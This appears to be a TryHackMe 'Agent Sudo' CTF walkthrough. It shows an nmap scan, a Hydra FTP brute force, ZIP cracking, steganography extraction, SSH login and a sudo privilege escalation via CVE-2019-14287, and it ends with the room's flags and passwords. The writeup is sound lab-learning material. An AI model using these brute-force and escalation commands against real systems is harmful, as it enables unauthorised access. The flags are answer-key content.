---
title: "TryHackMe - Agent Sudo CTF Walkthrough"
date: 2024-12-14
categories: [TryHackMe]
tags: [CTF, FTP, Steganography, Privilege Escalation]
image: assets/images/thm-cover/mr-robot-Cover.jpg
---

# TryHackMe - Agent Sudo CTF Walkthrough

---

## Step 1: Network Scanning

Use Nmap to scan the target and identify open ports and services.

```bash
sleep33@THM:~$ nmap -v -sCV -oN nmap.txt 10.10.89.193
```

### Results:
- **Open Ports**:
  - Port 21: FTP (vsftpd 3.0.3)
  - Port 22: SSH (OpenSSH 7.6p1)
  - Port 80: HTTP (Apache 2.4.29)
- **Interesting HTTP Title**: `Announcement`
- **Total Open Ports**: `3`

---

## Step 2: Directory Enumeration

Enumerate directories using Gobuster.

```bash
sleep33@THM:~$ gobuster dir -u http://10.10.89.193 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,js,txt,php,db,json,log,bak,old
```

### Results:
- `/index.php` (Status: 200)
- `.html` and `.php` (Status: 403)
- Secret page accessible via modifying the `User-Agent` header.

---

## Step 3: Investigating FTP Service

Attempt to brute-force FTP credentials using Hydra.

```bash
sleep33@THM:~$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.89.193 ftp
```

### Credentials Found:
- **Username:** `chris`
- **Password:** `crystal`

---

## Step 4: Exploring FTP

Log in to the FTP server and list its contents.

```bash
ftp> ls -la
```

### Files Found:
- `To_agentJ.txt`
- `cute-alien.jpg`
- `cutie.png`

Download the files for further analysis.

---

## Step 5: Analyzing `cutie.png`

Use Binwalk to inspect the file for hidden data.

```bash
sleep33@THM:~$ binwalk cutie.png
```

### Findings:
- Encrypted ZIP archive located at offset `0x8702`.

Extract the ZIP file.

```bash
sleep33@THM:~$ binwalk cutie.png -e
```

---

## Step 6: Cracking the ZIP File

Use `zip2john` to extract the hash and `john` to crack the password.

```bash
sleep33@THM:~$ zip2john 8702.zip > zip_hash.txt
sleep33@THM:~$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```

### Password Found:
- **Password:** `alien`

Extract the contents of the ZIP file. Inside, you find a message: `QXJlYTUx` which decodes to `Area51`.

---

## Step 7: Analyzing `cute-alien.jpg`

Use Steghide to extract hidden data from the image.

```bash
sleep33@THM:~$ steghide extract -sf cute-alien.jpg
```

### Results:
- **Passphrase:** `Area51`
- **Extracted File:** `message.txt`

Contents of `message.txt`:
```
Hi James,

Glad you find this message. Your login password is hackerrules!

Your buddy,
Chris
```

---

## Step 8: SSH Access

Log in via SSH using the provided credentials.

```bash
sleep33@THM:~$ ssh james@10.10.89.193
```

### Credentials:
- **Username:** `james`
- **Password:** `hackerrules`

Once logged in, locate the `user_flag.txt`.

```bash
james@agent-sudo:~$ cat user_flag.txt
```

**User Flag:**
```
b03d975e8c92a7c04146cfa7a5a313c7
```

---

## Step 9: Privilege Escalation

Check `sudo` permissions.

```bash
james@agent-sudo:~$ sudo -l
```

### Results:
- `(ALL, !root) /bin/bash`

Exploit the misconfigured `sudo` permissions to gain root access.

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
# whoami
root
```

Escalation exploit: **CVE-2019-14287**

---

## Step 10: Retrieving the Root Flag

Locate and read the `root_flag.txt`.

```bash
root@agent-sudo:~$ cat /root/root_flag.txt
```

**Root Flag:**
```
b53a02f55b57d4439e3341834d70c062
```

---

## Step 11: Identifying Agent R

Agent R is referenced multiple times throughout the challenge. Their identity is clarified in `message.txt`.

**Agent R:** `Roswell alien autopsy`

---

## Summary

In this walkthrough, we enumerated services, brute-forced FTP credentials, used steganography to uncover hidden messages, escalated privileges using misconfigured `sudo` permissions, and retrieved both the user and root flags.

### Key Information:
- **FTP Password:** `crystal`
- **ZIP Password:** `alien`
- **Steg Password:** `Area51`
- **SSH Password:** `hackerrules`
- **Agent Name:** `Chris`
- **Other Agent Full Name:** `James`
- **Incident:** `Roswell alien autopsy`
- **User Flag:** `b03d975e8c92a7c04146cfa7a5a313c7`
- **Root Flag:** `b53a02f55b57d4439e3341834d70c062`
